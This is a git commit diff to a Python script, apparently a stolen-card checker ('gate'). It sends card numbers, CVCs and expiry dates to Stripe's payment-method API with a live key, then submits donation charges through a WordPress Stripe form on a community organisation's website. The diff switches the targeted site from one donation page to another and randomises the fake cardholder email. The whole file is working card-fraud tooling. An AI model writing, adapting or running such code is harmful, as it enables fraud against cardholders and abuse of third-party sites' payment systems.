340d9d9aa43e0105578e1353033e6cf625de932e
Kira0621 <genpaypal01@gmail.com>
2025-12-23 08:46:39 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -29,19 +29,19 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&billing_details[name]=Gen+Paypal&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fa741502ffc%3B+stripe-js-v3%2Fa741502ffc%3B+card-element&key=pk_live_MCzNhnDPK3fiYLraXzAWBgpg'
+	data = f'type=card&billing_details[name]=Gen+Paypal&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+card-element&key=pk_live_51LqLrcKuYyCGsqVmBqB3jxUQeCs9GCzZG82Y0qXBJdE6WyvpXeKTBGpJ0xv0ObkWN98nTCwHInf77IpJv5Ka1ZEk00zcyPxtd9'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'av.vu',
+	    'authority': 'mauritaniancommunity-dmv-usa.org',
 	    'accept': 'application/json, text/javascript, */*; q=0.01',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://av.vu',
-	    'referer': 'https://av.vu/payments/',
+	    'origin': 'https://mauritaniancommunity-dmv-usa.org',
+	    'referer': 'https://mauritaniancommunity-dmv-usa.org/membership-donations/',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -53,21 +53,23 @@ def Tele(ccx):
 	}
 	
 	data = {
-	    'action': 'wp_full_stripe_inline_payment_charge',
-	    'wpfs-form-name': 'USD_inline',
+	    'action': 'wp_full_stripe_inline_donation_charge',
+	    'wpfs-form-name': 'Dmv',
 	    'wpfs-form-get-parameters': '%7B%7D',
+	    'wpfs-custom-amount': 'other',
 	    'wpfs-custom-amount-unique': '1',
-	    'wpfs-custom-input[]': 'Genpaypal',
-	    'wpfs-card-holder-email': 'genpaypal01@gmail.com',
+	    'wpfs-donation-frequency': 'one-time',
+	    'wpfs-card-holder-email': f'genpaypal{random_amount1}{random_amount2}@gmail.com',
 	    'wpfs-card-holder-name': 'Gen Paypal',
 	    'wpfs-stripe-payment-method-id': f'{pm}',
 	}
 	
-	response = requests.post('https://av.vu/absolutev/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = requests.post(
+	    'https://mauritaniancommunity-dmv-usa.org/wp-admin/admin-ajax.php',
+	    headers=headers,
+	    data=data,
+	)
 	
-	try:
-		result = response.json()['message']
-	except:
-		result = response.text
+	result = response.json()['message']
 	
 	return result
